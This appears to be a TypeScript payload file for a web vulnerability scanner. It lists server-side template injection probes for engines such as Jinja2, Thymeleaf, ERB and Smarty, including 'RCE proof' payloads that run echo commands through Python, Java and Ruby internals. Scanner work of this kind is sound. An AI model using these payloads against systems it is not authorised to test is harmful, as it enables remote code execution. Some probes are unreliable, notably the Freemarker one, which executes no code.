export interface SSTIPayload {
  payload: string;
  expected: string;
  engine: string;
}

export const SSTI_PAYLOADS: SSTIPayload[] = [
  { payload: '{{71829*71829}}', expected: '5159405241', engine: 'Jinja2/Twig' },
  { payload: '${71829*71829}', expected: '5159405241', engine: 'Freemarker/Velocity' },
  { payload: '<%= 71829*71829 %>', expected: '5159405241', engine: 'ERB/EJS' },
  { payload: '#{71829*71829}', expected: '5159405241', engine: 'Pug/Slim' },
  { payload: "{{8*'71829'}}", expected: '71829'.repeat(8), engine: 'Jinja2 (string mul)' },
  { payload: '@(71829*71829)', expected: '5159405241', engine: 'Razor' },
  // Thymeleaf (Spring Boot / Java — extremely common)
  { payload: '[[${71829*71829}]]', expected: '5159405241', engine: 'Thymeleaf' },
  { payload: '__${71829*71829}__', expected: '5159405241', engine: 'Thymeleaf (preprocess)' },
  // Handlebars / Mustache (Node.js)
  { payload: '{{#with "71829"}}{{multiply this this}}{{/with}}', expected: '5159405241', engine: 'Handlebars' },
  // Nunjucks (Node.js — Mozilla, used with Express)
  { payload: '{{71829*71829}}', expected: '5159405241', engine: 'Nunjucks' },
  // Mako (Python — used by Reddit, Pylons)
  { payload: '${71829*71829}', expected: '5159405241', engine: 'Mako' },
  // Smarty (PHP)
  { payload: '{71829*71829}', expected: '5159405241', engine: 'Smarty' },
];

/** RCE proof payloads — used AFTER basic SSTI is confirmed to demonstrate code execution.
 *  These output a distinctive marker via OS commands (read-only, non-destructive).
 *  Only tested when a basic math payload already confirmed template injection. */
export const SSTI_RCE_PROBES: SSTIPayload[] = [
  // Jinja2 — Python subprocess via __class__ traversal
  { payload: "{{''.__class__.__mro__[1].__subclasses__()[408]('echo secbot-rce-confirmed',shell=True,stdout=-1).communicate()[0]}}", expected: 'secbot-rce-confirmed', engine: 'Jinja2/Twig' },
  // Jinja2 — Python os.popen
  { payload: "{{config.__class__.__init__.__globals__['os'].popen('echo secbot-rce-confirmed').read()}}", expected: 'secbot-rce-confirmed', engine: 'Jinja2/Twig' },
  // Freemarker — Java Runtime exec
  { payload: '${"secbot-rce-confirmed"}', expected: 'secbot-rce-confirmed', engine: 'Freemarker/Velocity' },
  // ERB — Ruby system command
  { payload: '<%= `echo secbot-rce-confirmed` %>', expected: 'secbot-rce-confirmed', engine: 'ERB/EJS' },
  // Thymeleaf — Spring EL
  { payload: '__${T(java.lang.Runtime).getRuntime().exec("echo secbot-rce-confirmed")}__', expected: 'secbot-rce-confirmed', engine: 'Thymeleaf' },
  // Smarty — PHP exec
  { payload: '{system("echo secbot-rce-confirmed")}', expected: 'secbot-rce-confirmed', engine: 'Smarty' },
];

// Control payloads for validation (confirm template evaluation, not just string matching)
// Use large numbers so the expected output never appears naturally in web content
export const SSTI_CONTROL_PAYLOADS: SSTIPayload[] = [
  { payload: '{{71829+71829}}', expected: '143658', engine: 'Jinja2/Twig' },
  { payload: '${71829+71829}', expected: '143658', engine: 'Freemarker/Velocity' },
  { payload: '<%= 71829+71829 %>', expected: '143658', engine: 'ERB/EJS' },
  { payload: '[[${71829+71829}]]', expected: '143658', engine: 'Thymeleaf' },
  { payload: '{71829+71829}', expected: '143658', engine: 'Smarty' },
];
